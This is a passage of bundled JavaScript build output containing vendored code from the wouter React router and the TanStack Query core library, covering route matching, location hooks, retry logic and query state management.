  var c, o, tmp, ext, keys = [], pattern = "", arr = input.split("/");
  arr[0] || arr.shift();
  while (tmp = arr.shift()) {
    c = tmp[0];
    if (c === "*") {
      keys.push(c);
      pattern += tmp[1] === "?" ? "(?:/(.*))?" : "/(.*)";
    } else if (c === ":") {
      o = tmp.indexOf("?", 1);
      ext = tmp.indexOf(".", 1);
      keys.push(tmp.substring(1, !!~o ? o : !!~ext ? ext : tmp.length));
      pattern += !!~o && !~ext ? "(?:/([^/]+?))?" : "/([^/]+?)";
      if (!!~ext) pattern += (!!~o ? "?" : "") + "\\" + tmp.substring(ext);
    } else {
      pattern += "/" + tmp;
    }
  }
  return {
    keys,
    pattern: new RegExp("^" + pattern + (loose ? "(?=$|/)" : "/?$"), "i")
  };
}

// node_modules/wouter/esm/react-deps.js
var import_shim = __toESM(require_shim(), 1);
import * as React from "react";
import { Fragment, cloneElement, createContext, createElement, forwardRef, isValidElement, useContext, useMemo, useRef as useRef2, useState } from "react";
var useBuiltinInsertionEffect = React["useInsertionEffect"];
var canUseDOM = !!(typeof window !== "undefined" && typeof window.document !== "undefined" && typeof window.document.createElement !== "undefined");
var useIsomorphicLayoutEffect = canUseDOM ? React.useLayoutEffect : React.useEffect;
var useInsertionEffect2 = useBuiltinInsertionEffect || useIsomorphicLayoutEffect;
var useEvent = (fn) => {
  const ref = React.useRef([fn, (...args) => ref[0](...args)]).current;
  useInsertionEffect2(() => {
    ref[0] = fn;
  });
  return ref[1];
};

// node_modules/wouter/esm/use-browser-location.js
var eventPopstate = "popstate";
var eventPushState = "pushState";
var eventReplaceState = "replaceState";
var eventHashchange = "hashchange";
var events = [
  eventPopstate,
  eventPushState,
  eventReplaceState,
  eventHashchange
];
var subscribeToLocationUpdates = (callback) => {
  for (const event of events) {
    addEventListener(event, callback);
  }
  return () => {
    for (const event of events) {
      removeEventListener(event, callback);
    }
  };
};
var useLocationProperty = (fn, ssrFn) => (0, import_shim.useSyncExternalStore)(subscribeToLocationUpdates, fn, ssrFn);
var currentSearch = () => location.search;
var useSearch = ({ ssrSearch = "" } = {}) => useLocationProperty(currentSearch, () => ssrSearch);
var currentPathname = () => location.pathname;
var usePathname = ({ ssrPath } = {}) => useLocationProperty(
  currentPathname,
  ssrPath ? () => ssrPath : currentPathname
);
var navigate = (to, { replace = false, state = null } = {}) => history[replace ? eventReplaceState : eventPushState](state, "", to);
var useBrowserLocation = (opts = {}) => [usePathname(opts), navigate];
var patchKey = Symbol.for("wouter_v3");
if (typeof history !== "undefined" && typeof window[patchKey] === "undefined") {
  for (const type of [eventPushState, eventReplaceState]) {
    const original = history[type];
    history[type] = function() {
      const result = original.apply(this, arguments);
      const event = new Event(type);
      event.arguments = arguments;
      dispatchEvent(event);
      return result;
    };
  }
  Object.defineProperty(window, patchKey, { value: true });
}

// node_modules/wouter/esm/index.js
var _relativePath = (base, path) => !path.toLowerCase().indexOf(base.toLowerCase()) ? path.slice(base.length) || "/" : "~" + path;
var baseDefaults = (base = "") => base === "/" ? "" : base;
var absolutePath = (to, base) => to[0] === "~" ? to.slice(1) : baseDefaults(base) + to;
var relativePath = (base = "", path) => _relativePath(unescape(baseDefaults(base)), unescape(path));
var unescape = (str) => {
  try {
    return decodeURI(str);
  } catch (_e) {
    return str;
  }
};
var defaultRouter = {
  hook: useBrowserLocation,
  searchHook: useSearch,
  parser: parse,
  base: "",
  // this option is used to override the current location during SSR
  ssrPath: void 0,
  ssrSearch: void 0,
  // optional context to track render state during SSR
  ssrContext: void 0,
  // customizes how `href` props are transformed for <Link />
  hrefs: (x) => x
};
var RouterCtx = createContext(defaultRouter);
var useRouter = () => useContext(RouterCtx);
var Params0 = {};
var ParamsCtx = createContext(Params0);
var useParams = () => useContext(ParamsCtx);
var useLocationFromRouter = (router) => {
  const [location2, navigate2] = router.hook(router);
  return [
    relativePath(router.base, location2),
    useEvent((to, navOpts) => navigate2(absolutePath(to, router.base), navOpts))
  ];
};
var useLocation = () => useLocationFromRouter(useRouter());
var matchRoute = (parser, route, path, loose) => {
  const { pattern, keys } = route instanceof RegExp ? { keys: false, pattern: route } : parser(route || "*", loose);
  const result = pattern.exec(path) || [];
  const [$base, ...matches] = result;
  return $base !== void 0 ? [
    true,
    (() => {
      const groups = keys !== false ? Object.fromEntries(keys.map((key, i) => [key, matches[i]])) : result.groups;
      let obj = { ...matches };
      groups && Object.assign(obj, groups);
      return obj;
    })(),
    // the third value if only present when parser is in "loose" mode,
    // so that we can extract the base path for nested routes
    ...loose ? [$base] : []
  ] : [false, null];
};
var Router = ({ children, ...props }) => {
  const parent_ = useRouter();
  const parent = props.hook ? defaultRouter : parent_;
  let value = parent;
  const [path, search] = props.ssrPath?.split("?") ?? [];
  if (search) props.ssrSearch = search, props.ssrPath = path;
  props.hrefs = props.hrefs ?? props.hook?.hrefs;
  let ref = useRef2({}), prev = ref.current, next = prev;
  for (let k in parent) {
    const option = k === "base" ? (
      /* base is special case, it is appended to the parent's base */
      parent[k] + (props[k] || "")
    ) : props[k] || parent[k];
    if (prev === next && option !== next[k]) {
      ref.current = next = { ...next };
    }
    next[k] = option;
    if (option !== parent[k] || option !== value[k]) value = next;
  }
  return createElement(RouterCtx.Provider, { value, children });
};
var h_route = ({ children, component }, params) => {
  if (component) return createElement(component, { params });
  return typeof children === "function" ? children(params) : children;
};
var useCachedParams = (value) => {
  let prev = useRef2(Params0);
  const curr = prev.current;
  return prev.current = // Update cache if number of params changed or any value changed
  Object.keys(value).length !== Object.keys(curr).length || Object.entries(value).some(([k, v]) => v !== curr[k]) ? value : curr;
};
var Route = ({ path, nest, match: match2, ...renderProps }) => {
  const router = useRouter();
  const [location2] = useLocationFromRouter(router);
  const [matches, routeParams, base] = (
    // `match` is a special prop to give up control to the parent,
    // it is used by the `Switch` to avoid double matching
    match2 ?? matchRoute(router.parser, path, location2, nest)
  );
  const params = useCachedParams({ ...useParams(), ...routeParams });
  if (!matches) return null;
  const children = base ? createElement(Router, { base }, h_route(renderProps, params)) : h_route(renderProps, params);
  return createElement(ParamsCtx.Provider, { value: params, children });
};
var Link = forwardRef((props, ref) => {
  const router = useRouter();
  const [currentPath, navigate2] = useLocationFromRouter(router);
  const {
    to = "",
    href: targetPath = to,
    onClick: _onClick,
    asChild,
    children,
    className: cls,
    /* eslint-disable no-unused-vars */
    replace,
    state,
    /* eslint-enable no-unused-vars */
    ...restProps
  } = props;
  const onClick = useEvent((event) => {
    if (event.ctrlKey || event.metaKey || event.altKey || event.shiftKey || event.button !== 0)
      return;
    _onClick?.(event);
    if (!event.defaultPrevented) {
      event.preventDefault();
      navigate2(targetPath, props);
    }
  });
  const href = router.hrefs(
    targetPath[0] === "~" ? targetPath.slice(1) : router.base + targetPath,
    router
    // pass router as a second argument for convinience
  );
  return asChild && isValidElement(children) ? cloneElement(children, { onClick, href }) : createElement("a", {
    ...restProps,
    onClick,
    href,
    // `className` can be a function to apply the class if this link is active
    className: cls?.call ? cls(currentPath === targetPath) : cls,
    children,
    ref
  });
});
var flattenChildren = (children) => Array.isArray(children) ? children.flatMap(
  (c) => flattenChildren(c && c.type === Fragment ? c.props.children : c)
) : [children];
var Switch = ({ children, location: location2 }) => {
  const router = useRouter();
  const [originalLocation] = useLocationFromRouter(router);
  for (const element of flattenChildren(children)) {
    let match2 = 0;
    if (isValidElement(element) && // we don't require an element to be of type Route,
    // but we do require it to contain a truthy `path` prop.
    // this allows to use different components that wrap Route
    // inside of a switch, for example <AnimatedRoute />.
    (match2 = matchRoute(
      router.parser,
      element.props.path,
      location2 || originalLocation,
      element.props.nest
    ))[0])
      return cloneElement(element, { match: match2 });
  }
  return null;
};
var Redirect = (props) => {
  const { to, href = to } = props;
  const router = useRouter();
  const [, navigate2] = useLocationFromRouter(router);
  const redirect = useEvent(() => navigate2(to || href, props));
  const { ssrContext } = router;
  useIsomorphicLayoutEffect(() => {
    redirect();
  }, []);
  if (ssrContext) {
    ssrContext.redirectTo = to;
  }
  return null;
};

// node_modules/@tanstack/query-core/build/modern/subscribable.js
var Subscribable = class {
  constructor() {
    this.listeners = /* @__PURE__ */ new Set();
    this.subscribe = this.subscribe.bind(this);
  }
  subscribe(listener) {
    this.listeners.add(listener);
    this.onSubscribe();
    return () => {
      this.listeners.delete(listener);
      this.onUnsubscribe();
    };
  }
  hasListeners() {
    return this.listeners.size > 0;
  }
  onSubscribe() {
  }
  onUnsubscribe() {
  }
};

// node_modules/@tanstack/query-core/build/modern/utils.js
var isServer = typeof window === "undefined" || "Deno" in globalThis;
function noop() {
}
function functionalUpdate(updater, input) {
  return typeof updater === "function" ? updater(input) : updater;
}
function isValidTimeout(value) {
  return typeof value === "number" && value >= 0 && value !== Infinity;
}
function timeUntilStale(updatedAt, staleTime) {
  return Math.max(updatedAt + (staleTime || 0) - Date.now(), 0);
}
function resolveStaleTime(staleTime, query) {
  return typeof staleTime === "function" ? staleTime(query) : staleTime;
}
function resolveEnabled(enabled, query) {
  return typeof enabled === "function" ? enabled(query) : enabled;
}
function matchQuery(filters, query) {
  const {
    type = "all",
    exact,
    fetchStatus,
    predicate,
    queryKey,
    stale
  } = filters;
  if (queryKey) {
    if (exact) {
      if (query.queryHash !== hashQueryKeyByOptions(queryKey, query.options)) {
        return false;
      }
    } else if (!partialMatchKey(query.queryKey, queryKey)) {
      return false;
    }
  }
  if (type !== "all") {
    const isActive = query.isActive();
    if (type === "active" && !isActive) {
      return false;
    }
    if (type === "inactive" && isActive) {
      return false;
    }
  }
  if (typeof stale === "boolean" && query.isStale() !== stale) {
    return false;
  }
  if (fetchStatus && fetchStatus !== query.state.fetchStatus) {
    return false;
  }
  if (predicate && !predicate(query)) {
    return false;
  }
  return true;
}
function matchMutation(filters, mutation) {
  const { exact, status, predicate, mutationKey } = filters;
  if (mutationKey) {
    if (!mutation.options.mutationKey) {
      return false;
    }
    if (exact) {
      if (hashKey(mutation.options.mutationKey) !== hashKey(mutationKey)) {
        return false;
      }
    } else if (!partialMatchKey(mutation.options.mutationKey, mutationKey)) {
      return false;
    }
  }
  if (status && mutation.state.status !== status) {
    return false;
  }
  if (predicate && !predicate(mutation)) {
    return false;
  }
  return true;
}
function hashQueryKeyByOptions(queryKey, options) {
  const hashFn = options?.queryKeyHashFn || hashKey;
  return hashFn(queryKey);
}
function hashKey(queryKey) {
  return JSON.stringify(
    queryKey,
    (_, val) => isPlainObject(val) ? Object.keys(val).sort().reduce((result, key) => {
      result[key] = val[key];
      return result;
    }, {}) : val
  );
}
function partialMatchKey(a, b) {
  if (a === b) {
    return true;
  }
  if (typeof a !== typeof b) {
    return false;
  }
  if (a && b && typeof a === "object" && typeof b === "object") {
    return Object.keys(b).every((key) => partialMatchKey(a[key], b[key]));
  }
  return false;
}
function replaceEqualDeep(a, b) {
  if (a === b) {
    return a;
  }
  const array = isPlainArray(a) && isPlainArray(b);
  if (array || isPlainObject(a) && isPlainObject(b)) {
    const aItems = array ? a : Object.keys(a);
    const aSize = aItems.length;
    const bItems = array ? b : Object.keys(b);
    const bSize = bItems.length;
    const copy = array ? [] : {};
    const aItemsSet = new Set(aItems);
    let equalItems = 0;
    for (let i = 0; i < bSize; i++) {
      const key = array ? i : bItems[i];
      if ((!array && aItemsSet.has(key) || array) && a[key] === void 0 && b[key] === void 0) {
        copy[key] = void 0;
        equalItems++;
      } else {
        copy[key] = replaceEqualDeep(a[key], b[key]);
        if (copy[key] === a[key] && a[key] !== void 0) {
          equalItems++;
        }
      }
    }
    return aSize === bSize && equalItems === aSize ? a : copy;
  }
  return b;
}
function shallowEqualObjects(a, b) {
  if (!b || Object.keys(a).length !== Object.keys(b).length) {
    return false;
  }
  for (const key in a) {
    if (a[key] !== b[key]) {
      return false;
    }
  }
  return true;
}
function isPlainArray(value) {
  return Array.isArray(value) && value.length === Object.keys(value).length;
}
function isPlainObject(o) {
  if (!hasObjectPrototype(o)) {
    return false;
  }
  const ctor = o.constructor;
  if (ctor === void 0) {
    return true;
  }
  const prot = ctor.prototype;
  if (!hasObjectPrototype(prot)) {
    return false;
  }
  if (!prot.hasOwnProperty("isPrototypeOf")) {
    return false;
  }
  if (Object.getPrototypeOf(o) !== Object.prototype) {
    return false;
  }
  return true;
}
function hasObjectPrototype(o) {
  return Object.prototype.toString.call(o) === "[object Object]";
}
function sleep(timeout) {
  return new Promise((resolve) => {
    setTimeout(resolve, timeout);
  });
}
function replaceData(prevData, data, options) {
  if (typeof options.structuralSharing === "function") {
    return options.structuralSharing(prevData, data);
  } else if (options.structuralSharing !== false) {
    if (false) {
      try {
        return replaceEqualDeep(prevData, data);
      } catch (error) {
        console.error(
          `Structural sharing requires data to be JSON serializable. To fix this, turn off structuralSharing or return JSON-serializable data from your queryFn. [${options.queryHash}]: ${error}`
        );
        throw error;
      }
    }
    return replaceEqualDeep(prevData, data);
  }
  return data;
}
function addToEnd(items, item, max3 = 0) {
  const newItems = [...items, item];
  return max3 && newItems.length > max3 ? newItems.slice(1) : newItems;
}
function addToStart(items, item, max3 = 0) {
  const newItems = [item, ...items];
  return max3 && newItems.length > max3 ? newItems.slice(0, -1) : newItems;
}
var skipToken = Symbol();
function ensureQueryFn(options, fetchOptions) {
  if (false) {
    if (options.queryFn === skipToken) {
      console.error(
        `Attempted to invoke queryFn when set to skipToken. This is likely a configuration error. Query hash: '${options.queryHash}'`
      );
    }
  }
  if (!options.queryFn && fetchOptions?.initialPromise) {
    return () => fetchOptions.initialPromise;
  }
  if (!options.queryFn || options.queryFn === skipToken) {
    return () => Promise.reject(new Error(`Missing queryFn: '${options.queryHash}'`));
  }
  return options.queryFn;
}
function shouldThrowError(throwOnError, params) {
  if (typeof throwOnError === "function") {
    return throwOnError(...params);
  }
  return !!throwOnError;
}

// node_modules/@tanstack/query-core/build/modern/focusManager.js
var FocusManager = class extends Subscribable {
  #focused;
  #cleanup;
  #setup;
  constructor() {
    super();
    this.#setup = (onFocus) => {
      if (!isServer && window.addEventListener) {
        const listener = () => onFocus();
        window.addEventListener("visibilitychange", listener, false);
        return () => {
          window.removeEventListener("visibilitychange", listener);
        };
      }
      return;
    };
  }
  onSubscribe() {
    if (!this.#cleanup) {
      this.setEventListener(this.#setup);
    }
  }
  onUnsubscribe() {
    if (!this.hasListeners()) {
      this.#cleanup?.();
      this.#cleanup = void 0;
    }
  }
  setEventListener(setup) {
    this.#setup = setup;
    this.#cleanup?.();
    this.#cleanup = setup((focused) => {
      if (typeof focused === "boolean") {
        this.setFocused(focused);
      } else {
        this.onFocus();
      }
    });
  }
  setFocused(focused) {
    const changed = this.#focused !== focused;
    if (changed) {
      this.#focused = focused;
      this.onFocus();
    }
  }
  onFocus() {
    const isFocused = this.isFocused();
    this.listeners.forEach((listener) => {
      listener(isFocused);
    });
  }
  isFocused() {
    if (typeof this.#focused === "boolean") {
      return this.#focused;
    }
    return globalThis.document?.visibilityState !== "hidden";
  }
};
var focusManager = new FocusManager();

// node_modules/@tanstack/query-core/build/modern/onlineManager.js
var OnlineManager = class extends Subscribable {
  #online = true;
  #cleanup;
  #setup;
  constructor() {
    super();
    this.#setup = (onOnline) => {
      if (!isServer && window.addEventListener) {
        const onlineListener = () => onOnline(true);
        const offlineListener = () => onOnline(false);
        window.addEventListener("online", onlineListener, false);
        window.addEventListener("offline", offlineListener, false);
        return () => {
          window.removeEventListener("online", onlineListener);
          window.removeEventListener("offline", offlineListener);
        };
      }
      return;
    };
  }
  onSubscribe() {
    if (!this.#cleanup) {
      this.setEventListener(this.#setup);
    }
  }
  onUnsubscribe() {
    if (!this.hasListeners()) {
      this.#cleanup?.();
      this.#cleanup = void 0;
    }
  }
  setEventListener(setup) {
    this.#setup = setup;
    this.#cleanup?.();
    this.#cleanup = setup(this.setOnline.bind(this));
  }
  setOnline(online) {
    const changed = this.#online !== online;
    if (changed) {
      this.#online = online;
      this.listeners.forEach((listener) => {
        listener(online);
      });
    }
  }
  isOnline() {
    return this.#online;
  }
};
var onlineManager = new OnlineManager();

// node_modules/@tanstack/query-core/build/modern/thenable.js
function pendingThenable() {
  let resolve;
  let reject;
  const thenable = new Promise((_resolve, _reject) => {
    resolve = _resolve;
    reject = _reject;
  });
  thenable.status = "pending";
  thenable.catch(() => {
  });
  function finalize(data) {
    Object.assign(thenable, data);
    delete thenable.resolve;
    delete thenable.reject;
  }
  thenable.resolve = (value) => {
    finalize({
      status: "fulfilled",
      value
    });
    resolve(value);
  };
  thenable.reject = (reason) => {
    finalize({
      status: "rejected",
      reason
    });
    reject(reason);
  };
  return thenable;
}

// node_modules/@tanstack/query-core/build/modern/retryer.js
function defaultRetryDelay(failureCount) {
  return Math.min(1e3 * 2 ** failureCount, 3e4);
}
function canFetch(networkMode) {
  return (networkMode ?? "online") === "online" ? onlineManager.isOnline() : true;
}
var CancelledError = class extends Error {
  constructor(options) {
    super("CancelledError");
    this.revert = options?.revert;
    this.silent = options?.silent;
  }
};
function isCancelledError(value) {
  return value instanceof CancelledError;
}
function createRetryer(config) {
  let isRetryCancelled = false;
  let failureCount = 0;
  let isResolved = false;
  let continueFn;
  const thenable = pendingThenable();
  const cancel = (cancelOptions) => {
    if (!isResolved) {
      reject(new CancelledError(cancelOptions));
      config.abort?.();
    }
  };
  const cancelRetry = () => {
    isRetryCancelled = true;
  };
  const continueRetry = () => {
    isRetryCancelled = false;
  };
  const canContinue = () => focusManager.isFocused() && (config.networkMode === "always" || onlineManager.isOnline()) && config.canRun();
  const canStart = () => canFetch(config.networkMode) && config.canRun();
  const resolve = (value) => {
    if (!isResolved) {
      isResolved = true;
      config.onSuccess?.(value);
      continueFn?.();
      thenable.resolve(value);
    }
  };
  const reject = (value) => {
    if (!isResolved) {
      isResolved = true;
      config.onError?.(value);
      continueFn?.();
      thenable.reject(value);
    }
  };
  const pause = () => {
    return new Promise((continueResolve) => {
      continueFn = (value) => {
        if (isResolved || canContinue()) {
          continueResolve(value);
        }
      };
      config.onPause?.();
    }).then(() => {
      continueFn = void 0;
      if (!isResolved) {
        config.onContinue?.();
      }
    });
  };
  const run = () => {
    if (isResolved) {
      return;
    }
    let promiseOrValue;
    const initialPromise = failureCount === 0 ? config.initialPromise : void 0;
    try {
      promiseOrValue = initialPromise ?? config.fn();
    } catch (error) {
      promiseOrValue = Promise.reject(error);
    }
    Promise.resolve(promiseOrValue).then(resolve).catch((error) => {
      if (isResolved) {
        return;
      }
      const retry = config.retry ?? (isServer ? 0 : 3);
      const retryDelay = config.retryDelay ?? defaultRetryDelay;
      const delay = typeof retryDelay === "function" ? retryDelay(failureCount, error) : retryDelay;
      const shouldRetry = retry === true || typeof retry === "number" && failureCount < retry || typeof retry === "function" && retry(failureCount, error);
      if (isRetryCancelled || !shouldRetry) {
        reject(error);
        return;
      }
      failureCount++;
      config.onFail?.(failureCount, error);
      sleep(delay).then(() => {
        return canContinue() ? void 0 : pause();
      }).then(() => {
        if (isRetryCancelled) {
          reject(error);
        } else {
          run();
        }
      });
    });
  };
  return {
    promise: thenable,
    cancel,
    continue: () => {
      continueFn?.();
      return thenable;
    },
    cancelRetry,
    continueRetry,
    canStart,
    start: () => {
      if (canStart()) {
        run();
      } else {
        pause().then(run);
      }
      return thenable;
    }
  };
}

// node_modules/@tanstack/query-core/build/modern/notifyManager.js
var defaultScheduler = (cb) => setTimeout(cb, 0);
function createNotifyManager() {
  let queue = [];
  let transactions = 0;
  let notifyFn = (callback) => {
    callback();
  };
  let batchNotifyFn = (callback) => {
    callback();
  };
  let scheduleFn = defaultScheduler;
  const schedule = (callback) => {
    if (transactions) {
      queue.push(callback);
    } else {
      scheduleFn(() => {
        notifyFn(callback);
      });
    }
  };
  const flush = () => {
    const originalQueue = queue;
    queue = [];
    if (originalQueue.length) {
      scheduleFn(() => {
        batchNotifyFn(() => {
          originalQueue.forEach((callback) => {
            notifyFn(callback);
          });
        });
      });
    }
  };
  return {
    batch: (callback) => {
      let result;
      transactions++;
      try {
        result = callback();
      } finally {
        transactions--;
        if (!transactions) {
          flush();
        }
      }
      return result;
    },
    /**
     * All calls to the wrapped function will be batched.
     */
    batchCalls: (callback) => {
      return (...args) => {
        schedule(() => {
          callback(...args);
        });
      };
    },
    schedule,
    /**
     * Use this method to set a custom notify function.
     * This can be used to for example wrap notifications with `React.act` while running tests.
     */
    setNotifyFunction: (fn) => {
      notifyFn = fn;
    },
    /**
     * Use this method to set a custom function to batch notifications together into a single tick.
     * By default React Query will use the batch function provided by ReactDOM or React Native.
     */
    setBatchNotifyFunction: (fn) => {
      batchNotifyFn = fn;
    },
    setScheduler: (fn) => {
      scheduleFn = fn;
    }
  };
}
var notifyManager = createNotifyManager();

// node_modules/@tanstack/query-core/build/modern/removable.js
var Removable = class {
  #gcTimeout;
  destroy() {
    this.clearGcTimeout();
  }
  scheduleGc() {
    this.clearGcTimeout();
    if (isValidTimeout(this.gcTime)) {
      this.#gcTimeout = setTimeout(() => {
        this.optionalRemove();
      }, this.gcTime);
    }
  }
  updateGcTime(newGcTime) {
    this.gcTime = Math.max(
      this.gcTime || 0,
      newGcTime ?? (isServer ? Infinity : 5 * 60 * 1e3)
    );
  }
  clearGcTimeout() {
    if (this.#gcTimeout) {
      clearTimeout(this.#gcTimeout);
      this.#gcTimeout = void 0;
    }
  }
};

// node_modules/@tanstack/query-core/build/modern/query.js
var Query = class extends Removable {
  #initialState;
  #revertState;
  #cache;
  #client;
  #retryer;
  #defaultOptions;
  #abortSignalConsumed;
  constructor(config) {
    super();
    this.#abortSignalConsumed = false;
    this.#defaultOptions = config.defaultOptions;
    this.setOptions(config.options);
    this.observers = [];
    this.#client = config.client;
    this.#cache = this.#client.getQueryCache();
    this.queryKey = config.queryKey;
    this.queryHash = config.queryHash;
    this.#initialState = getDefaultState(this.options);
    this.state = config.state ?? this.#initialState;
    this.scheduleGc();
  }
  get meta() {
    return this.options.meta;
  }
  get promise() {
    return this.#retryer?.promise;
  }
  setOptions(options) {
    this.options = { ...this.#defaultOptions, ...options };
    this.updateGcTime(this.options.gcTime);
  }
  optionalRemove() {
    if (!this.observers.length && this.state.fetchStatus === "idle") {
      this.#cache.remove(this);
    }
  }
  setData(newData, options) {
    const data = replaceData(this.state.data, newData, this.options);
    this.#dispatch({
      data,
      type: "success",
      dataUpdatedAt: options?.updatedAt,
      manual: options?.manual
    });
    return data;
  }
  setState(state, setStateOptions) {
    this.#dispatch({ type: "setState", state, setStateOptions });
  }
  cancel(options) {
    const promise = this.#retryer?.promise;
    this.#retryer?.cancel(options);
    return promise ? promise.then(noop).catch(noop) : Promise.resolve();
  }
  destroy() {
    super.destroy();
    this.cancel({ silent: true });
  }
  reset() {
    this.destroy();
    this.setState(this.#initialState);
  }
  isActive() {
    return this.observers.some(
      (observer) => resolveEnabled(observer.options.enabled, this) !== false
    );
  }
  isDisabled() {
    if (this.getObserversCount() > 0) {
      return !this.isActive();
    }
    return this.options.queryFn === skipToken || this.state.dataUpdateCount + this.state.errorUpdateCount === 0;
  }
  isStatic() {
    if (this.getObserversCount() > 0) {
      return this.observers.some(
        (observer) => resolveStaleTime(observer.options.staleTime, this) === "static"
      );
    }
    return false;
  }
  isStale() {
    if (this.getObserversCount() > 0) {
      return this.observers.some(
        (observer) => observer.getCurrentResult().isStale
      );
    }
    return this.state.data === void 0 || this.state.isInvalidated;
  }
  isStaleByTime(staleTime = 0) {
    if (this.state.data === void 0) {
      return true;
    }
    if (staleTime === "static") {
      return false;
    }
    if (this.state.isInvalidated) {
      return true;
    }
    return !timeUntilStale(this.state.dataUpdatedAt, staleTime);
  }
  onFocus() {
    const observer = this.observers.find((x) => x.shouldFetchOnWindowFocus());
    observer?.refetch({ cancelRefetch: false });
    this.#retryer?.continue();
  }
  onOnline() {
    const observer = this.observers.find((x) => x.shouldFetchOnReconnect());
    observer?.refetch({ cancelRefetch: false });
    this.#retryer?.continue();
  }
  addObserver(observer) {
    if (!this.observers.includes(observer)) {
      this.observers.push(observer);
      this.clearGcTimeout();
      this.#cache.notify({ type: "observerAdded", query: this, observer });
    }
  }
  removeObserver(observer) {
    if (this.observers.includes(observer)) {
      this.observers = this.observers.filter((x) => x !== observer);
      if (!this.observers.length) {
        if (this.#retryer) {
          if (this.#abortSignalConsumed) {
            this.#retryer.cancel({ revert: true });
          } else {
            this.#retryer.cancelRetry();
          }
        }
        this.scheduleGc();
      }
      this.#cache.notify({ type: "observerRemoved", query: this, observer });
    }
  }
  getObserversCount() {
    return this.observers.length;
  }
  invalidate() {
    if (!this.state.isInvalidated) {
      this.#dispatch({ type: "invalidate" });
    }
  }
  fetch(options, fetchOptions) {
    if (this.state.fetchStatus !== "idle") {
      if (this.state.data !== void 0 && fetchOptions?.cancelRefetch) {
        this.cancel({ silent: true });
      } else if (this.#retryer) {
        this.#retryer.continueRetry();
        return this.#retryer.promise;
      }
    }
    if (options) {
      this.setOptions(options);
    }
    if (!this.options.queryFn) {
      const observer = this.observers.find((x) => x.options.queryFn);
      if (observer) {
        this.setOptions(observer.options);
      }
    }
    if (false) {
      if (!Array.isArray(this.options.queryKey)) {
        console.error(
          `As of v4, queryKey needs to be an Array. If you are using a string like 'repoData', please change it to an Array, e.g. ['repoData']`
        );
      }
    }
    const abortController = new AbortController();
    const addSignalProperty = (object) => {
      Object.defineProperty(object, "signal", {
        enumerable: true,
        get: () => {
          this.#abortSignalConsumed = true;
          return abortController.signal;
        }
      });
    };
    const fetchFn = () => {
      const queryFn = ensureQueryFn(this.options, fetchOptions);
      const createQueryFnContext = () => {
        const queryFnContext2 = {
          client: this.#client,
          queryKey: this.queryKey,
          meta: this.meta
        };
        addSignalProperty(queryFnContext2);
        return queryFnContext2;
      };
      const queryFnContext = createQueryFnContext();
      this.#abortSignalConsumed = false;
      if (this.options.persister) {
        return this.options.persister(
          queryFn,
          queryFnContext,
          this
        );
      }
      return queryFn(queryFnContext);
    };
    const createFetchContext = () => {
      const context2 = {
        fetchOptions,
        options: this.options,
        queryKey: this.queryKey,
        client: this.#client,
        state: this.state,
        fetchFn
      };
      addSignalProperty(context2);
      return context2;
    };
    const context = createFetchContext();
    this.options.behavior?.onFetch(context, this);
    this.#revertState = this.state;
    if (this.state.fetchStatus === "idle" || this.state.fetchMeta !== context.fetchOptions?.meta) {
      this.#dispatch({ type: "fetch", meta: context.fetchOptions?.meta });
    }
    const onError = (error) => {
      if (!(isCancelledError(error) && error.silent)) {
        this.#dispatch({
          type: "error",
          error
        });
      }
      if (!isCancelledError(error)) {
        this.#cache.config.onError?.(
          error,
          this
        );
        this.#cache.config.onSettled?.(
          this.state.data,
          error,
          this
        );
      }
      this.scheduleGc();
    };
    this.#retryer = createRetryer({
      initialPromise: fetchOptions?.initialPromise,
      fn: context.fetchFn,
      abort: abortController.abort.bind(abortController),
      onSuccess: (data) => {
        if (data === void 0) {
          if (false) {
            console.error(
              `Query data cannot be undefined. Please make sure to return a value other than undefined from your query function. Affected query key: ${this.queryHash}`
            );
          }
          onError(new Error(`${this.queryHash} data is undefined`));
          return;
        }
        try {
          this.setData(data);
        } catch (error) {
          onError(error);
          return;
        }
        this.#cache.config.onSuccess?.(data, this);
        this.#cache.config.onSettled?.(
          data,
          this.state.error,
          this
        );
        this.scheduleGc();
      },
      onError,
      onFail: (failureCount, error) => {
        this.#dispatch({ type: "failed", failureCount, error });
      },
      onPause: () => {
        this.#dispatch({ type: "pause" });
      },
      onContinue: () => {
        this.#dispatch({ type: "continue" });
      },
      retry: context.options.retry,
      retryDelay: context.options.retryDelay,
      networkMode: context.options.networkMode,
      canRun: () => true
    });
    return this.#retryer.start();
  }
  #dispatch(action) {
    const reducer2 = (state) => {
      switch (action.type) {
        case "failed":
          return {
            ...state,
            fetchFailureCount: action.failureCount,
            fetchFailureReason: action.error
          };
        case "pause":
          return {
            ...state,
            fetchStatus: "paused"
          };
        case "continue":
          return {
            ...state,
            fetchStatus: "fetching"
          };
        case "fetch":
          return {
            ...state,
            ...fetchState(state.data, this.options),
            fetchMeta: action.meta ?? null
          };
        case "success":
          this.#revertState = void 0;
          return {
            ...state,
            data: action.data,
            dataUpdateCount: state.dataUpdateCount + 1,
            dataUpdatedAt: action.dataUpdatedAt ?? Date.now(),
            error: null,
            isInvalidated: false,
            status: "success",
            ...!action.manual && {
              fetchStatus: "idle",
              fetchFailureCount: 0,
              fetchFailureReason: null
            }
          };
        case "error":
          const error = action.error;
          if (isCancelledError(error) && error.revert && this.#revertState) {
            return { ...this.#revertState, fetchStatus: "idle" };
          }
          return {
            ...state,
            error,
            errorUpdateCount: state.errorUpdateCount + 1,
            errorUpdatedAt: Date.now(),
            fetchFailureCount: state.fetchFailureCount + 1,
            fetchFailureReason: error,
            fetchStatus: "idle",
            status: "error"
          };
        case "invalidate":
          return {
            ...state,
            isInvalidated: true
          };
        case "setState":
          return {
            ...state,
            ...action.state
          };
      }
    };
    this.state = reducer2(this.state);
    notifyManager.batch(() => {
      this.observers.forEach((observer) => {
        observer.onQueryUpdate();
      });
      this.#cache.notify({ query: this, type: "updated", action });
    });
  }
};
function fetchState(data, options) {
  return {
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchStatus: canFetch(options.networkMode) ? "fetching" : "paused",
    ...data === void 0 && {
      error: null,
      status: "pending"
    }
  };
}
function getDefaultState(options) {
  const data = typeof options.initialData === "function" ? options.initialData() : options.initialData;
  const hasData = data !== void 0;
  const initialDataUpdatedAt = hasData ? typeof options.initialDataUpdatedAt === "function" ? options.initialDataUpdatedAt() : options.initialDataUpdatedAt : 0;
  return {
    data,
    dataUpdateCount: 0,
    dataUpdatedAt: hasData ? initialDataUpdatedAt ?? Date.now() : 0,
    error: null,
    errorUpdateCount: 0,
    errorUpdatedAt: 0,
    fetchFailureCount: 0,
    fetchFailureReason: null,
    fetchMeta: null,
    isInvalidated: false,
